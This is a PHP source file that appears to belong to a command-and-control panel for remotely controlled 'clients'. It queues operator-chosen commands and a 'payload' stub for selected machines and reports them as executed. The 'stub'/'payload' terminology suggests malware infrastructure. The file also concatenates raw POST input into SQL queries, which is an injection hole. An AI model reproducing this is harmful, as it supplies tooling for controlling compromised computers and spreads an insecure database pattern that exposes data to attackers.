<?php

session_start();
include('./database/db-config.php');
include("./database/db-conn.php");
if(!isset($_POST['command']) || !isset($_POST['check']))
{
    $_SESSION['command-fail'] = true;
    header('location: /');
    die();
}

$command = $_POST['command'];
$clients = $_POST['check'];
$stubid = $_POST['payload'];
$succesMessage = "Executed ". $command . " on clients: ";

foreach ($clients as $key => $id) {
    $sql = "INSERT INTO command (Client_Id, Command, StubId) VALUES(" . $id . ", '".$command."', '".$stubid."') ON DUPLICATE KEY UPDATE Client_Id=$id, Command='$command', StubId=$stubid";
    $dbconn->exec($sql);

    $succesMessage.= $id . ",";
}

$succesMessage = substr_replace($succesMessage, "", -1);

$_SESSION['command-succes'] = $succesMessage;

header('location: /');

?>